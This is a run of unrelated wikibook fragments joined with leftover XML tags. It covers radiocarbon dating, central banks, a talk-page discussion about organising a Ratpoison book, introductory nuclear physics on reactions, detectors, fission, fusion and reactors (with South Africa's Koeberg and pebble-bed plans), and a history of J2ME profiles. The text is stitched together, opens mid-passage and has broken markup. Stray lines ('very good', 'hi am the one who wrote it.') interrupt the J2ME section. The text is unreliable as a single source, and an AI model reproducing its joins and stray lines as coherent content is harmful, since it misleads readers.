Therefore, by measuring the radioactive emissions from once-living matter and comparing its activity with the equilibrium level of
emissions from things living today, an estimation of the time elapsed can be made. For example, if the rate of the radioactive
emissions from a piece of wood, caused by the decay of &lt;math&gt;{}^{14}_{6}&lt;/math&gt;C, is one-half lower than from living trees, 
then we can conclude that we are at the point &lt;math&gt;t=T_{1/2}&lt;/math&gt; on the curve 15.2, i.e. it is elapsed exactly one
half-life-time period. According to the Table 15.2, this means that the tree, from which this piece of wood was made, was cut approximately 5730 years ago.

This is how physicists help archaeologists to assign dates to various organic materials.</text>

      <text xml:space="preserve">&lt;b&gt;Central banks&lt;/b&gt; are national banks that primarily control the monetary policy of the national economy, through changes in the &lt;i&gt;interest rate&lt;/i&gt;. However, they also perform other duties, such as holding reserves of foreign currency, bankrolling government borrowing, and acting as the 'banker's bank', or the 'lender of last resort'.

There are two types of central bank, those that are state-controlled or at best quasi-independent, and those that are fully independent such as the US [[w:Federal Reserve|Federal Reserve]] and UK [[w:Bank of England|Bank of England]] (since 1997). Due to the potential for political interference in economic policy, with aims other than macroeconomic stability, the potential for infamous &lt;i&gt;boom and bust&lt;/i&gt; cycles in an economy is greater for non-independent central banks.

      <text xml:space="preserve">== Organizing the book ==
I noticed your new book [[Using Ratpoison]]. It seems to get very professional. I just want to let you know at an early stage, that a prefered way of creating subpages is &quot;/&quot; or &quot;:&quot; (without spaces before and afterwards), where &quot;/&quot; gives you the additional advantage that you get an automatic link back to your main page. Have a look at the discussion at [[Wikibooks:Hierarchy naming scheme]] or the recent conversion at [[Talk:How To Build A Computer#Organizing the book]]. 
I'd therefore recommend to organize your book like this:
 [[Using Ratpoison]]        &lt;- should be what you currently call Table of Contents
 [[Using Ratpoison/Cover]]  &lt;- Move your cover here (you can link from the bookshelf here)
 [[Using Ratpoison/Introduction]]  &lt;- move &quot;What is Ratpoison&quot; and &quot;Pros and cons&quot; here
 [[Using Ratpoison/Your first steps]]
and so on.
Avoid having too many subpages if you don't have the content yet. For your book, 3 or 4 subpages are enough (more can be easily created later as soon as you have enough content). If there are questions, just ask. --[[User:Andreas Ipp|Andreas]] 10:11, 23 Mar 2005 (UTC)
:Thank you very much for your feedback. This is in fact my first wikibook, so I am glad for any hints that I can get. I will edit the pages subsequently as soon as I can find some spare time. [[User:Etnoy|Etnoy]] 08:16, 26 Mar 2005 (UTC)
I hope you don't mind me taking the liberty here to implement this.  Don't forget that the pipe character '|' can be used to show a link name that differs from the link path, for clarity's sake.  [[User:Orethrius|Orethrius van Degaurde]] 07:04, 18 Jun 2005 (UTC)
:Actually, it looks like Etnoy has this well in-hand, the bookshelf just needs a little cleanup.  [[User:Orethrius|Orethrius van Degaurde]] 07:09, 18 Jun 2005 (UTC)

== Reorganisation ==
I merged the two ToCs, it might be prudent to delete the old one.  [[User:Orethrius|Orethrius van Degaurde]] 07:21, 18 Jun 2005 (UTC)

:Actually, now that I think of it, this should go in the ToC, and the Cover should go here. [[User:Orethrius|Orethrius van Degaurde]] 07:21, 18 Jun 2005 (UTC)

:: Done!  Hope that's made it a little more prettiful.  [[User:Orethrius|Orethrius van Degaurde]] 07:28, 18 Jun 2005 (UTC)</text>

= Nuclear Reactions =

Those of you who studied chemistry, are familiar with the notion of chemical reaction, which, in essence, is
just regrouping of atoms that constitute molecules. As a result, reagent chemical compounds are
transformed into product compounds.

In the world of nuclear particles, similar processes are possible. When nuclei are close to each other, nucleons from one nucleus can
''jump'' into another one. This happens because there are attractive and repulsive forces between the nucleons. The complicated interplay
of these forces may cause their regrouping. As a result, the reagent particles are transformed into product particles. Such
processes are called ''nuclear reactions''.

For example, when two isotopes &lt;math&gt;{}^3_2&lt;/math&gt;He collide, the six nucleons constituting them, can rearrange in such a way that the isotope
&lt;math&gt;{}^4_2&lt;/math&gt;He is formed and two protons are liberated. Similarly to chemical reactions, this process is denoted as

{| 
|- 
|&lt;math&gt;\begin{matrix}{}^3_2{\rm He} + {}^3_2{\rm He} \longrightarrow{}^4_2{\rm He} + p + p + 12.86\,{\rm MeV}\ \end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (15.3)
|}

The same as in chemical reactions, nuclear reactions can also be either exothermic (i.e. releasing energy) or endothermic (i.e.
requiring an energy input). The above reaction releases 12.86MeV of energy. This is because the total mass on the left hand side of
Eq. (15.3) is in 12.86MeV greater than the total mass of the products on the right hand side (you can
check this using Table 15.1).

Thus, when considering a particular nuclear reaction, we can always learn if it releases or absorbs energy. For this, we only need to
compare total masses on the left and right hand sides of the equation. Now, you can understand why it is very convenient to
express masses in the units of energy.

Composing equations like (15.3), we should always check the superscripts and subscripts of the nuclei in order
to have the same number of nucleons and the same charge on both sides of the equation. In the above example, we have six nucleons
and the charge +4 in both the initial and final states of the reaction. To make the checking of nucleon number and charge
conservation easier, sometimes the proton and neutron are denoted with superscripts and subscripts as well, namely, &lt;math&gt;{}^1_1p&lt;/math&gt;and &lt;math&gt;{}^1_0n&lt;/math&gt;. 

In this case, all we need is to check that sum of superscripts and sum of subscripts are the same on both sides of the equation.</text>

= Detectors =

How can we observe such tiny tiny things as protons and &lt;math&gt;\alpha&lt;/math&gt;-particles? There is no microscope that would be 
able to discern them. From the very beginning of the sub-atomic era, scientists have been working on the development of special
instruments that are called particle detectors. These devices enable us either to register the mere fact that certain particle has passed
through certain point in space or to observe the trace of its path (the trajectory). Actually, this is as good as watching the
particle. Although the particle sizes are awfully small, when passing through some substances, they leave behind visible traces of
tens of centimeters in length. By measuring the curvature of the trajectory of a particle deflected in electric or magnetic field, a
physicist can determine the charge and mass of the particle and thus can identify it.

== Geiger counter ==

The most familiar device for registering charged particles is the Geiger counter. It cannot tell
you anything about the particle except the fact that it has passed through the counter. The counter consists of a thin metal cylinder
filled with gas. A wire electrode runs along the center of the tube and is kept at a high voltage (&lt;math&gt;\sim 2000&lt;/math&gt;V) relative to the 
cylinder. When a particle passes through the tube, it causes ionization of the gas atoms and thus an electric discharge between
the cylinder and the wire. The electric pulse can be counted by a computer or made to produce a ''click'' in a loudspeaker. The number
of counts per second tells us about intensity of the radiation.

== Fluorescent screen ==

The very first detector was the fluorescent screen. When a charged particle hits the screen, a human
eye can discern a flash of light at the point of impact. In fact, we all use this kind of detectors every day when watching TV of looking
at a computer (if it does not have an LCD screen of course). Indeed, the images on the screens of their electron-ray tubes are formed by
the accelerated electrons.

== Photo-emulsion ==

Another type of particle detector, dating back to Becquerel, is the nuclear photographic emulsion.
Passage of charged particles is recorded in the emulsion in the same way that ordinary black and white photographic film records a
picture. The only difference is that nuclear photoemulsion is made rather thick in order to catch a significant part of the particle
path. After the developing, a permanent record of the charged particle trajectory is available.

== Wilson's chamber ==

In the fields of sub-atomic physics and nuclear physics, Wilson's cloud chamber is the most fundamental
device to observe the trajectories of particles. Its basic principle was discovered by C. T. R. Wilson
in 1897, and it was put to the practical use in 1911. 

The top and the side of the chamber are covered with round glasses of several centimeters in diameter. At the bottom of the chamber, a
piston is placed. The air filled in the chamber is saturated with vapor of water. When pulling down the piston quickly, the volume of
the chamber would be expanded and the temperature goes down. As a result, the air inside would be supersaturated with the vapor. If a
fast moving charged particle enters the chamber when it is in such a supersaturated state, the vapor of water would condense along the
line of the ions generated by the particle, which is the path of the particle. Thus we can observe the trace, and also take a photograph.
To make clear the trace, a light is sometimes illuminated from the side. When placing the cloud chamber in a magnetic field, we can
obtain various informations about the charged particle by measuring the curvature of the trace and other data. The bubble chamber and
the spark chamber have taken place of the cloud chamber which is nowadays used only for the educational purposes. Wilson's cloud
chamber has however played a very important role in the history of physics.

== Bubble chamber ==

Bubble chamber is a particle detector of major importance during the initial years of high-energy physics.
The bubble chamber has produced a wealth of physics from about 1955 well into the 1970s. It is based on the principle of bubble
formation in a liquid heated above its boiling point, which is then suddenly expanded, starting boiling where passing charged particles
have ionized the atoms of the liquid. The technique was honoured by the Nobel prize award to D. Glaser in 1960. Even today, bubble
chamber photographs provide the aesthetically most appealing visualization of subnuclear collisions.

== Spark chamber ==

Spark chamber is a historic device using electric discharges over a gap between two electrodes with
large potential difference, to render passing particles visible. Sparks occurred where the gas had been ionized. Most often, multiple
short gaps were used, but wide-gap chambers with gaps up to 40 cm were also built. The spark chamber is still of great scientific
value in that it remains relatively simple and cheap to build as well as enabling an observer to view the paths of charged particles.</text>

= Nuclear Energy =

Nuclei can produce energy via two different types of reactions, namely, ''fission'' and ''fusion''
reactions. Fission is a break up of a nucleus in two or more pieces (smaller nuclei). Fusion is the opposite process: Formation of a
bigger nucleus from two small nuclei.

A question may arise: How two opposite processes can both produce energy? Can we make an inexhaustible souce of energy by breaking up
and then fusing the same nuclei? Of course not! The energy conservation law cannot be circumvented in no way. When speaking
about fusion and fission, we speak about different ranges of nuclei. Energy can only be released when either light nuclei fuse or heavy nuclei fission.

To understand why this is so, let us recollect that for releasing energy the mass of initial nuclei must be greater than the mass of
the products of a nuclear reaction. The mass difference is transformed into the released energy. And why the product nuclei can
loose some mass as compared to the initial nuclei? Because they are more tightly
bound, i.e. their binding energies are lager.

Fig. 15.3 shows the dependence of the binding energy &lt;math&gt;B&lt;/math&gt; per nucleon on the number &lt;math&gt;A&lt;/math&gt; of nucleons constituting a 
nucleus. As you see, the curve reaches the maximum value of &lt;math&gt;\sim9&lt;/math&gt;MeV per nucleon at around &lt;math&gt;A\sim50&lt;/math&gt;. The nuclei with such 
number of nucleons cannot produce energy neither through fusion nor through fission. They are kind of ''ashes'' and cannot serve as a
fuel. In contrast to them, very light nuclei, when fused with each other, make more tightly bound products as well as very heavy nuclei
do when split up in lighter fragments.

In fission processes, which were discovered and used first, a heavy nucleus like, for example, uranium or plutonium, splits up in two
fragments which are both positively charged. These fragments repel each other by an electric force and move apart at a high speed,
distributing their kinetic energy in the surrounding material. 

In fusion reactions everything goes in the opposite direction. Very light nuclei, like hydrogen or helium isotopes, when approaching
each other to a distance of a few fm (&lt;math&gt;1fm = 10^{-13}&lt;/math&gt;cm), experience strong attraction which overpowers their Coulomb (that is
electric) repulsion. As a result the two nuclei fuse into a single nucleus. They collapse with extremely high speeds towards each
other. To form a stable nucleus they must get rid of the excessive energy. This energy is emitted by ejecting a neutron or a photon.</text>

= Nuclear Reactors =

Since the discovery of radioactivity it was known that heavy nuclei release energy in the processes of
spontaneous decay. This process, however, is rather slow and cannot be influenced (speed up or slow down) by humans and therefore could
not be effectively used for large-scale energy production. Nonetheless, it is ideal for feeding the devices that must work
autonomously in remote places for a long time and do not require much energy. For this, heat from the spontaneous-decays can be
converted into electric power in a radioisotope thermoelectric generator. These generators have been used to power space probes
and some lighthouses built by Russian engineers. Much more effective way of using nuclear energy is based on another type of
nuclear decay which is considered next.

== Chain reaction ==

The discovery that opened up the era of nuclear energy was made in 1939 by German physicists O. Hahn,
L. Meitner, F Strassmann, and O. Frisch. They found that a uranium nucleus, after absorbing a neutron, splits into two fragments. This
was not a spontaneous but induced fission 

{| 
|- 
|&lt;math&gt;\begin{matrix}n+ {}^{235}_{92}{\rm U} \longrightarrow {}^{140}_{54}{\rm Xe} +{}^{94}_{38}{\rm Sr}+ n + n + 185\,{\rm MeV}\end{matrix}&lt;/math&gt;
|-

(15.4)
|}

that released &lt;math&gt;\sim185&lt;/math&gt;MeV of energy as well as two neutrons which could cause similar reactions on surrounding nuclei. The fact that
instead of one initial neutron, in the reaction (15.4) we obtain two neutrons, is crucial. This gives us the possibility to make the so-called ''chain reaction''
schematically shown in Fig. 15.4.


{|

|- 
| [[Image:Fhsst_atomnucl5.png|400px|]]
|}

In such process, one neutron breaks one heavy nucleus, the two released neutrons break two more heavy nuclei and produce four
neutrons which, in turn, can break another four nuclei and so on. This process develops extremely fast. In a split of a second a huge
amount of energy can be released, which means explosion. In fact, this is how the so-called atomic bomb works.

Can we control the development of the chain reaction? Yes we can! This is done in nuclear reactors that produce energy for our use.
How can it be done?

== Critical mass ==

First of all, if the piece of material containing fissile nuclei is too small, some neutrons may
reach its surface and escape without causing further fissions. For each type of fissile material there is therefore a minimal mass of a
sample that can support explosive chain reaction. It is called the ''critical mass''. For example, the critical mass of &lt;math&gt;{}^{235}_{92}{\rm U}&lt;/math&gt;is approximately 50kg. 
If the mass is below the critical value, nuclear explosion is not possible, but the energy is still released and the sample becomes hot. The
closer mass is to its critical value, the more energy is released and more intensive is the neutron radiation from the sample.

The criticality of a sample (i.e. its closeness to the critical state) can be reduced by changing its geometry (making its surface
bigger) or by putting inside it some other material (boron or cadmium) that is able to absorb neutrons. On the other hand, the
criticality can be increased by putting neutron reflectors around the sample. These reflectors work like mirrors from which the
escaped neutrons bounce back into the sample. Thus, moving in and out the absorbing material and reflectors, we can keep the sample
close to the critical state. 

== How a nuclear reactor works ==

In a typical nuclear reactor, the fuel is not in one piece, but in the form of several hundred
vertical rods, like a brush. Another system of rods that contain a neutron absorbing material (control rods) can move up and down in
between the fuel rods. When totally in, the control rods absorb so many neutrons, that the reactor is shut down. To start the reactor,
operator gradually moves the control rods up. In an emergency situation they are dropped down automatically.

To collect the energy, water flows through the reactor core. It becomes extremely hot and goes to a steam generator. There, the heat
passes to water in a secondary circuit that becomes steam for use outside the reactor enclosure for rotating turbines that generate
electricity.

== Nuclear power in South Africa ==

By 2004 South Africa had only one commercial nuclear reactor supplying power into the national grid.
It works in Koeberg located 30km north of Cape Town. A small research reactor was also operated at Pelindaba as part of the
nuclear weapons program, but was dismantled.

Koeberg Nuclear Power station is a uranium Pressurized Water Reactor (PWR). In such a reactor, the primary coolant loop is pressurised so
the water does not boil, and heat exchangers, called steam generators, are used to transmit heat to a secondary coolant which
is allowed to boil to produce steam. To remove as much heat as possible, the water temperature in the primary loop is allowed to
rise up to about &lt;math&gt;300^{\circ}&lt;/math&gt;C which requires the pressure of 150 atmospheres (to keep water from boiling).

The Koeberg power station has the largest turbine generators in the southern hemisphere and produces 1800 megawatts of electrical 
power. Construction of Koeberg began in 1976 and two of its Units were commissioned in 1984-1985. Since then, the plant has been in
more or less continuous operation and there have been no serious incidents.

Eskom that operates this power station, may be the current technology leader. It is developing a new type of nuclear reactor, a
modular pebble-bed reactor (PBMR). In contrast to traditional nuclear reactors, in this new type of reactors the fuel is not
assembled in the form of rods. The uranium, thorium or plutonium fuels are in oxides (ceramic form) contained within spherical
pebbles made of pyrolitic graphite. The pebbles, having a size of a tennis ball, are in a bin or can. An inert gas, helium, nitrogen or
carbon dioxide, circulates through the spaces between the fuel pebbles. This carries heat away from the reactor.

Ideally, the heated gas is run directly through a turbine. However since the gas from the primary coolant can be made radioactive by
the neutrons in the reactor, usually it is brought to a heat exchanger, where it heats another gas, or steam.

The primary advantage of pebble-bed reactors is that they can be designed to be inherently safe. When a pebble-bed reactor gets
hotter, the more rapid motion of the atoms in the fuel increases the probability of neutron capture by &lt;math&gt;{}^{238}_{92}&lt;/math&gt;U isotopes 
through an effect known as Doppler broadening. This isotope does not split up after capturing a neutron. This reduces the number of
neutrons available to cause  &lt;math&gt;{}^{235}_{92}&lt;/math&gt;U fission, reducing the power output by the reactor. This natural negative
feedback places an inherent upper limit on the temperature of the fuel without any operator intervention.

The reactor is cooled by an inert, fireproof gas, so it cannot have a steam explosion as a water reactor can.

A pebble-bed reactor thus can have all of its supporting machinery fail, and the reactor will not crack, melt, explode or spew
hazardous wastes. It simply goes up to a designed &quot;idle&quot; temperature, and stays there. In that state, the reactor vessel
radiates heat, but the vessel and fuel spheres remain intact and undamaged. The machinery can be repaired or the fuel can be removed.

A large advantage of the pebble bed reactor over a conventional water reactor is that they operate at higher temperatures. The
reactor can directly heat fluids for low pressure gas turbines. The high temperatures permit systems to get more mechanical energy from
the same amount of thermal energy. 

Another advantage is that fuel pebbles for different fuels might be used in the same basic design of reactor (though perhaps not at the
same time). Proponents claim that some kinds of pebble-bed reactors should be able to use thorium, plutonium and natural unenriched
Uranium, as well as the customary enriched uranium. One of the projects in progress is to develop pebbles and reactors that use the
plutonium from surplus or expired nuclear explosives. 


On June 25, 2003, the South African Republic's Department of Environmental Affairs and Tourism approved ESKOM's prototype 110MW
pebble-bed modular reactor for Koeberg. Eskom also has approval for a pebble-bed fuel production plant in Pelindaba. The uranium for
this fuel is to be imported from Russia. If the trial is successful, Eskom says it will build up to ten local PBMR plants on
South Africa's seacoast. Eskom also wants to export up to 20 PBMR plants per year. The estimated export revenue is 8 billion rand a
year, and could employ about 57000 people.</text>

      <text xml:space="preserve">'''Java 2 Platform, Micro Edition''', or '''[[w:J2ME|J2ME]]''', is a collection of [[w:java programming language|Java]] [[w:Application Programming Interface|API]]s targeting embedded consumer products such as [[w:Personal Digital Assistant|PDA]]s, [[w:cell phone|cell phone]]s and other consumer appliances.

J2ME has become a popular option for creating games for cell phones, as they can be emulated on a [[w:Personal computer|PC]] during the development stage and easily uploaded to the phone.  This contrasts with the difficulty of developing, testing, and loading games for other special gaming platforms such as those made by [[w:Nintendo|Nintendo]], [[w:Sony|Sony]], and others, as expensive system-specific hardware and kits are required.

Often, introductions of J2ME gloss over areas that the beginning J2ME developer might improve  their learning process  and hopefully this set of articles will remove that obstacle.  What we will cover is the history leading up to [[w:J2ME|J2ME]]'s birth and beyond.  We will also cover the complexity of the whole J2ME API ecological system and hopefully this will help you in your J2ME development projects and applications.

Overall, the change from analogue to digital in both devices and infrastructure serving those devices has been the third unseen character in this J2ME evolution. Changes from analogue methods of cellular communciation to such standards as [[w:CDMA|CDMA]], [[w:TDMA|TDMA]],and [[w:WCDMA|WCDMA]]. Also, drastic changes in the vehicle computing and digital tv realm involving new standards such as [[w:DVB|DVB]], [[w:MHP|MHP]], [[w:HAVi|HAVi]], [[w:MPEG4|MPEG4]], [[w:OSGi|OSGi]], and etc have changed how computer languages such as Java and the J2ME platform interact with this new area.

===A brief history of Java on Mobile Devices (pre-platform and pre-jcp)===
This history is called pre-platform and occurs before the 1999 Sun event of renaming java portions as platform editions.  In the 1992  time span [[w:Sun Microsystems|Sun Microsystems]] Engineers and  Venture Capital funded Startups contributed to a project called Green ({{Web_reference | title=Green | work=The Brief History of the Green Project | URL=http://today.java.net/jag/old/green/}}) to bring new Virtual Machine execution framework to embedded devices.  The device was called Star7 and was powered by a SPARC CPU.

The language which was called OAK at the time and its features were the result of the merge of FirstPerson, ON,  and Sun Microsystems. Although, not mentioned in this brief history ({{Web reference | title=Java 5th Birthday | work=JAVA TECHNOLOGY: THE EARLY YEARS | URL=http://java.sun.com/features/1998/05/birthday.html}}).  The first JVM was in fact completed by ON and based on Smalltalk according to The official Wiki version of history of Java Language ({{Web reference | title=Java History | work=The official Wiki version of history of Java Language | URL=http://c2.com/cgi/wiki?JavaHistory}}). Thus, the having the small foot print of a Virtual Machine not only benefited the birth of [[w:Java|Java]] but its steady climb during this period into browsers and the start of its rebirth into mobile devices.

Although Sun Microsystems concluded that some of its role during this period was to drive the Consumer Device market away from WINTEL to [[w:SPARC|SPARC]] processors it was the application killer app side that survived this risky startup time period. 

====PersonalJava (pJava)====
Sun's second exploration of java on mobile devices was centered around the idea of deploying a subset of JDK1.1.8 ({{Web reference | title=JDK1.1.8 | work=Java Development Kit 1.1.8_10 | URL=http://java.sun.com/products/archive/jdk/1.1.8_010/index.html}}) on mobile devices that have a more in depth display as opposed to just a character display. At this time, around 1998, one of the target devices for [[w:PersonalJava|PersonalJava]] was set boxes as evidence by press such as McNealy touts Java on set boxes ({{Web reference | title=McNealy | work= McNealy touts Java Everywhere, TCI deal | URL=http://www.infoworld.com/cgi-bin/displayStory.pl?980112.emcnealy.htm}}).

As the PersonalJava spec ({{Web reference | title=PersonalJava spec | work=PersonalJava API Specification | URL=http://java.sun.com/products/personaljava/spec-1-1/pJavaSpec.html}}) was introduced in 1998 it was nicknamed pJava by Sun Microsystems.  Because pJava uses a subset of JDK1.1.8, SUN Microsystems released a pJava Emulation Environment ({{Web reference | title=pJava Emulation Environment | work=PersonalJava Emulation Environment | URL=http://java.sun.com/products/personaljava/pj-emulation.html}}) to assist developers in testing their applets and applications for pJava Compliance.

====EmbeddedJava====
[[w:EmbeddedJava|EmbeddedJava]] ({{Web reference | title=EmbeddedJava | work=EmbeddedJava Application Environment | URL=http://java.sun.com/products/embeddedjava/}}) was based on JDK1.1.6 ({{Web reference | title=JDK1.1.6 | work=JDK1.1.6 Download | URL=http://java.sun.com/products/archive/jdk/1.1.6_009/}}) and was targeted for those mobile devices that only had a character display.

====JavaPhone====
The Mobile device OEMs found that the PersonalJava and EmbeddedJava solutions lacked those APIs that would allow access to pure telephony functionality on Mobile Devices.  Thus [[w:JavaPhone|JavaPhone]] API ({{Web reference | title=JavaPhone | work=JavaPhone API | URL=http://java.sun.com/products/javaphone/index.jsp}}) was designed by [[w:Sun Microsystems|Sun Microsystems]] to be vertical expansion of PersonalJava to add telephony functionality to deployed java solutions on Mobile devices.

====JavaTV====
[[w:JavaTV|JavaTV]] ({{Web reference | title=JavaTV | work=Java TV API | URL=http://java.sun.com/products/javatv/}}) is designed to provide java apis for the set box and headless network terminals beyond what PersonalJava provides that are specific to the iTV/DTV platform such as [[w:HAVi|HAVi]], [[w:DVB-MHP|DVB-MHP]], and etc.

====AutoJava====
AutoJava was also a 1998 [[w:Sun Microsystems|Sun Microsystems]] push into telematics (Auto) and did not get enough traction to survive as a separate api.

====JavaOS====
[[w:JavaOS|JavaOS]] ({{Web reference | title=JavaOS | work=JavaOS: A StandAlone Java Environment | URL=http://java.sun.com/products/javatv/}}) targets the underlying RealTimeOS ([[w:RTOS|RTOS]]) structure of the OS that typcially is deployed on Mobile Devices or Embedded Devices. JavaOS was launched by SUN Microsystems in the fall of 1996 and was based on the JDK1.0. ChorusOS which was bought  during JavaOS development by SUN Microsystems was later spun off as ChorusOS ({{Web reference | title=ChorusOS OpenSource | work=ChorusOS Open Source | URL=http://www.experimentalstuff.com/Technologies/ChorusOS/}}).

===Birth of J2ME===
As you can see by this NewsFlash ({{Web reference | title=SUN NewsFlash | work=SUN ANNOUNCES KEY CONSUMER TECHNOLOGY TO BRING THE POWER OF THE JAVA PLATFORM TO AUTO, TV AND PHONE MARKETS | URL=http://www.sun.com/smi/Press/sunflash/1998-03/sunflash.980324.14.html}}) in the spring of 1998 the Mobile Device market was being stormed by java but not in a very structured fashion.  As you can see from an Interview of the Father of KVM ({{Web reference | title=Interview of the Father of the KVM | work=J2ME Luminary Antero Taivalsaari | URL=http://developers.sun.com/techtopics/mobility/midp/luminaries/taivalsaari/}}) Sun was behind the scenes responding to this fragmentation in the Mobile Device space by innovating a new JVM for Mobile Devices and the first set of J2ME platform specs and as a project was nicknamed Spotless.

===J2ME is Alive===
In the time period of 1998-1999 SUN Microsystems reveals its behind the scenes work in defeating fragmentation in the Mobile Device space by announcing the formation of the [[w:Java Community Process|Java Community Process]] and reorganizing these fragments of java apis for mobile devices into the [[w:J2ME|J2ME]], Microediton Platform.  Let us now go over how J2ME is organized against API fragmentation in the Mobile Device space.

====J2ME Configurations====
Sun Microsystems came up with the idea that a configuration API would cover the runtime aspects of J2ME deployed on a device. The smallest J2ME configurations are actually subsets of the largest J2ME configuration.  The runtime aspects are covered by having these specific classes in the configuration api:

* Core Java classes
* Java programming language features
* Virtual Machine features

Currently, there are the configurations of CLDC (Connected Limited Device Configuration) and CDC (Connected Device Configuration). 

=====Connected Limited Device Configuration=====
The [[w:Connected Limited Device Configuration|CLDC]] covers devices below 512k size of memory for the JVM environment and removes JNI, user defined class loaders, some class verification items of the class verification process (the reason why we MIDlet Preverify MIDlets compiled to be deployed on CLDC devices) and reflection to fit into this small footprint. The JVM on CLDC devices is called KVM (K-VirtualMachine), nicknamed K-VirtualMachine for kilobyte. The application lifecycle concepts from javaTV and the installation concepts of javaPhone found their way into this Connected Limited Device Configuration. The JSRs for CLDC are:

* {{Web reference | title=CLDC1.0 | work=Connected Limited Device Configuration 1.0 JSR30 | URL=http://www.jcp.org/en/jsr/detail?id=30}}  This Connected Limited Device Configuration 1.0 targets devices with 128k to 512k memory (256kROM/256RAM or less), limited power or battery operation, connectivity to some network at low speeds, and user interface.
* {{Web reference | title=CLDC1.1 | work=Connected Limited Device Configuration 1.1 JSR139 | URL=http://www.jcp.org/en/jsr/detail?id=139}}  This Connected Limited Device Configuration 1.1 targets devices with 160K or more memory, processor speeds of 8-32MHZ, limited power or battery operation, and user interface.  This configuration adds extends CLDC1.0 to included floating point math.
very good

=====Connected Device Configuration=====
The [[w:Connected Device Configuration|CDC]] covers devices above the 512k size of memory for the JVM environment. The garbage collector is a separate pluggable item into the CVM deployed on CDC devices.  The threads are implemented not as OS specific but as fully implemented threads within the CVM and are known as Green Threads.  Threads can also be implemented as OS native threads. Class file verification takes place in the CVM on the device just as in J2SE java platform on desktop systems. The JVM on CDC devices is known as a CVM or the C-VirtualMachine. The JSRs for CDC are:

* {{Web reference | title=Connected Device Configuration 1.0 | work=Connected Device Configuration 1.0 JSR36 | URL=http://www.jcp.org/en/jsr/detail?id=36 | date=March 17 | year=2005}} This Connected Device Configuration 1.0 targets devices with 512k minimum ROM/128k minimum RAM, connectivity to some network, supports a complete installation of a complete JVM, and  more full featured user interfaces compared to CLDC.
* {{Web reference | title=Connected Device Configuration 1.1 | work=Connected Device Configuration 1.1 JSR218 | URL=http://www.jcp.org/en/jsr/detail?id=218 | date=March 17 | year=2005}}  This Connected Device Configuration 1.1 extends/updates the CDC1.0 to update J2SE APIs used in CDC1.0 to J2SE 1.4 APIs. Memory size was increased from 128k ROM to 256k ROM.

====J2ME Profiles====
Profiles provide APIs that focus on a specific group of devices.  These devices typically have the same or similar user interfaces (screen and inputs), how the device connects to the network, how the device stores data, and etc.  Currently, the Profile Name indicates the Family name of this group of devices or a common functionality with this group of devcies.  For example, the MIDP (MID Profile) is for the group of Mobile Information Devices. J2ME Profiles are:

=====Mobile Information Device Profile=====
The Mobile Information Device Profile extends and enhances the CLDC to provide a Java environment to develop applications on Mobile information appliances and voice communication devices.  The JSRs for this profile are:

* {{Web reference | title=MIDP1.0 | work=Mobile Information Device Profile 1.0 JSR37 | URL=http://www.jcp.org/en/jsr/detail?id=37}}  This Mobile Information Device Profile 1.0 extends the CLDC1.0 java environment in a vertical way to support MIDlet application development on devices targeted in the CLDC1.0 spec by providing a GUI toolkit, persistent data storage,  messaging, networking components, and security.  Although, attributes of JavaPhone and Java Telephony are mentioned in the spec; JavaPhone telephony attributes are not included as classes in MIDP1.0 but later on completed as a separate JSR and API package.
* {{Web reference | title=MIDP2.0 | work=Mobile Information Device Profile 2.0 JSR118 | URL=http://www.jcp.org/en/jsr/detail?id=118}}  This Mobile Information Device Profile 2.0 extends MIDP1.0 to include https networking, the domain security model with digital certificates, formally includes OTA provisioning, push architecture of MIDlets responding to events, game functionality added to LCDUI, small xml parser, and a base sound API.
* {{Web reference | title=MIDP3.0 | work=Mobile Information Device Profile 3.0 JSR271 | URL=http://www.jcp.org/en/jsr/detail?id=271}}  This Mobile Information Device Profie 3.0 extends MIDP2.0 to allow MIDlets to be auto-launched, run in background within the same VM, and enable inter-MIDlet communication.  Extended functionality includes secure record stores/removable record stores, IPv6, multiple network interfaces per device, and additional MIDlet provisioning in addition to OTA.

=====Foundation Profile=====
The Foundation Profile is what can be called a vertical specification profile.  A vertical specification profile specifies the targeted family of devices by memory size and the optional profiles that may plugin more functionality in addition to this profile. The GUI APIs are often Profiles plugged in on top of this Profile. Typical rich network devices include set top boxes (iTV), auto-computing (telematics), and etc. The JSRs for this profile are:

* {{Web reference | title=Foundation Profile 1.0 | work=Foundation Profile 1.0 JSR46 | URL=http://www.jcp.org/en/jsr/detail?id=46}}  This Foundation Profile 1.0 targets devices with 128k minimum ROM/512k minimum RAM, connectivity to some network, and no graphical user interface provided by this profile on top of the CDC1.0.
* {{Web reference | title=Foundation Profile 1.1 | work=Foundation Profile 1.1 JSR219 | URL=http://www.jcp.org/en/jsr/detail?id=219}}  This Foundation Profile 1.1 is on top of the CDC1.1 which supports J2SE 1.4 APIs.  Targeted devices memory is increased to 256k minimum ROM/512k minimum RAM. Some APIs included to specify functionality for IPv6, security, and more math support.
hi am the one who wrote it.

=====Personal Profile=====
This Personal Profile provides high web fidelity to device with a rich network connection  and can use the heavy weight applet classes that were part of the PersonalJava spec. While Personal Profile, JSR62, supports PersonalJava1.1.x and PersonalJava1.2.x of the PersonalJava Application Environment; Personal Profile 1.1 supports the adoption of the subset of J2SE1.4 APIs as Personal Profile 1.0 was based on the subset of J2SE1.3 APIs. The JSRs for this profile are:

* {{Web reference | title=Personal Profile 1.0 | work=Personal Profile 1.0  JSR62 | URL=http://www.jcp.org/en/jsr/detail?id=62}}  This Personal Profile 1.0 targets devices with 1.5Megs of minimum ROM/1Megs of minimum RAM, and a robust network connection is on top of the CDC1.0 and Foundation Profile1.0 and allows applications developed with pJava Emulation Environment Specification 1.1.x and 1.1.2 to run on devices targeted by this profile.
* {{Web reference | title=Personal Profile 1.1 | work=Personal Profile 1.1 JSR216 | URL=http://www.jcp.org/en/jsr/detail?id=216}}  This Personal Profile 1.1 extends the Personal Profile 1.0 to update APIs to J2SE 1.4 and to make sure optional Graphics Packages derived from J2SE 1.4 APIs can be deployed on top of this profile. Devices targeted now are of minimum memory size of 3.5Megs ROM/3.5 RAM.

=====Personal Basis Profile=====
This Personal Basis Profile provides a basic graphical user interface, ie the AWT lighweight APIs, on top of the CDC and Foundation Profile and is considered as a subset to the Personal Profiles. This profile also provides the xlet classes required for JavaTV. The JSRs for this profile are:

